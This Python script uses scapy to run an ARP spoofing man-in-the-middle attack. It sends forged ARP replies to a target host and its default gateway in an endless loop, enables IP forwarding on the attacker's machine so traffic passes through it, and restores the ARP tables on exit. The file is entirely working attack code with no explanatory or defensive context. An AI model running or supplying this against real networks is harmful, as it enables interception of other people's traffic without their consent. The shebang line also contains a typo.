#!/usr/bin/evn python

import scapy.all as scapy
import time
import subprocess
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i1", "--ip1", dest="ip1", help="Specify the Target IP")
    parser.add_argument("-i2", "--ip2", dest="ip2", help="Specify the Default Gateway IP")
    options = parser.parse_args()
    if not options.ip1 or not options.ip2:
        parser.error("Please specify the IP address")

    return options


def get_mac(ip: str) -> str:
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_response_list = scapy.srp(arp_request_broadcast, timeout=10, verbose=False)[0]
    return answered_response_list[0][1].hwsrc

def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
    scapy.send(packet, count=4, verbose=False)

def spoof(target_ip, spoof_ip, target_mac):
    # target_mac = get_mac(target_ip)
    # op = 2 means ARP response
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


sent_packets_count = 0
options = get_arguments()
ip_1 = options.ip1
ip_2 = options.ip2
# ip_1 = "192.168.146.135"
# ip_2 = "192.168.146.2"
try:
    subprocess.run(["echo 1 > /proc/sys/net/ipv4/ip_forward"], shell=True)
    target_mac_1 = get_mac(ip_1)
    target_mac_2 = get_mac(ip_2)
    while True:
        spoof(ip_1, ip_2, target_mac_1)
        spoof(ip_2, ip_1, target_mac_2)
        sent_packets_count += 2
        print("\r[+] Packets sent:" + str(sent_packets_count), end="")
        time.sleep(10)
except:
    print("\nRestoring.........")
    restore(ip_1, ip_2)
    restore(ip_2, ip_1)
    subprocess.run(["echo 0 > /proc/sys/net/ipv4/ip_forward"], shell=True)
    print("Restored.")

